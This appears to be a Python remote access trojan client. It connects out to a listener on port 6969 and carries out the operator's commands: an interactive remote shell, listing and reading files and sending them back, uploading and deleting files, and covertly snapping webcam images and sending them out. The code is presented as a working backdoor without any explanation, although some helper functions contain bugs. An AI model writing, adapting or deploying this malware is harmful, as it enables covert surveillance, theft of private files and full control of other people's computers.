#!/bin/python3

import socket
import os , sys
import shutil as sh
import cv2
import subprocess as sp
import time

# ------------------------------------- func ------------------------------------------

def send_len(data):
    leng = len(data)
    leng = str(leng)
    sock.send(leng.encode())

def fopen(val):
    try:
        with open(val,'r') as file:
            op_file = file.read()
        f = op_file.replace('\n','\n')
        send_len(f)
        sock.send(f.encode())
        
    except FileNotFoundError as f:
        f = str(f)
        send_len(f)
        sock.send(f.encode())

def cam():

    global frame
    
    cam = cv2.VideoCapture(0)
    check , frame = cam.read()
    #snap = cv2.imshow('snappy.......',frame)
    cv2.imwrite('wallpaper.jpg',frame)
    #cv2.waitKey(0)
    #cam.release()

def rand(ext):

    global fname

    letter = 'qwertyuopasdfghjklzxcvbnm'
    fname = ''.join(random.sample(letter,5))
    fname = fname.ext


def shell(data):
    proc = sp.Popen(data, shell=True, stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.PIPE)
    op = proc.stdout.read() + proc.stderr.read()
    send_len(op)
    sock.send(op)


def get_pwd():
    pwd = os.getcwd()
    return pwd

# -------------------------------------------------------------------------------------

def commands():
    while 1:

        res = sock.recv(1024)
        res = res.decode()

        if res[:2] == 'ls':
            try:
                value = res[3:].strip()

                if value == '':
                    ls = os.listdir()
                    ls = str(ls)
                    send_len(ls)
                    sock.send(ls.encode())
                else:
                    ls = os.listdir(value)
                    ls = str(ls)
                    send_len(ls)
                    sock.send(ls.encode())
                    
            except FileNotFoundError as f:
                f = str(f)
                send_len(f)
                sock.send(f.encode())

        elif res == 'shell':
            try:
                while True:

                    pwd = get_pwd()
                    sock.send(pwd.encode())
                    data = sock.recv(2000)
                    data = data.decode()

                    if data == 'exit':
                        break

                    elif data == 'none':
                        pass

                    elif data[:2] == 'cd':
                        fpath = data[2:].strip()
                        os.chdir(fpath)
                        sock.send('ok'.encode())

                    else:
                        shell(data)

            except PermissionError as p:
                sock.send(str(p).encode())
                pass


        elif res[:4] == "open":

            value = res[4:].strip()
            fopen(value)

                        
        elif res == 'hostname':
            hn = socket.gethostname()
            send_len(hn)
            sock.send(hn.encode())
                
        elif res == 'pwd':
            pwd = os.getcwd()
            send_len(pwd)
            sock.send(pwd.encode())

        elif res[:2] == 'cd':
            try:
                value = res[2:].strip()
                os.chdir(value)
                pwd = os.getcwd()
                send_len(pwd)
                sock.send(pwd.encode())

            except ValueError as v:
                v = str(v)
                send_len(v)
                sock.send(v.encode())
                
            except FileNotFoundError as f:
                f = str(f)
                send_len(f)
                sock.send(f.encode())
                
            except PermissionError as pe:
                pe = str(pe)
                send_len(pe)
                sock.send(pe.encode())

        elif res == 'snap':
            cam()
            with open('wallpaper.jpg','rb') as file:
                pic = file.read()
            byts = len(pic)
            sock.send(str(byts).encode())
            sock.send(pic)
            os.unlink('wallpaper.jpg')

        elif res == 'upload':

            fname = sock.recv(1024)
            fname = fname.decode()
            # print(f"got the file name {fname}")
            leng = sock.recv(1024)
            leng = leng.decode()
            data = sock.recv(int(leng))
            with open(fname, 'wb') as file:
                file.write(data)
                    

        elif res[:4] == 'move':
            try:
                value = recv[4:].strip()
                fname,path = str(value).split()
                move = sh.move(filename,path)
                sock.send('moved to '+path.encode())

            except PermissionError as p :
                sock.send(str(p).encode())

            except ValueError as v:
                sock.send(str(v).encode())
                
            except FileNotFoundError as f:
                sock.send(str(f).encode())

        elif res[:8] == 'download':

            value = res[8:].strip()
            fopen(value)

                    
        elif res[:3] == 'del':
            try:
                fname = res[3:].strip()
                os.unlink(fname)
                msg = f'{fname} is deleted ...'
                send_len(msg)
                sock.send(msg.encode())
                
            except FileNotFoundError as f:
                f = str(f)
                send_len(f)
                sock.send(f.encode())

        elif res == 'exit':
            sys.exit()

        else:
            cmds = "Command not found , Try 'help' for available commands ....."
            send_len(cmds)
            sock.send(cmds.encode())

try:

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 6969
    host = '127.0.0.1'
    sock.connect((host, port))
    commands()
    
except ConnectionResetError:
    sock.shutdown(socket.SHUT_RDWR)
    sock.close()
    

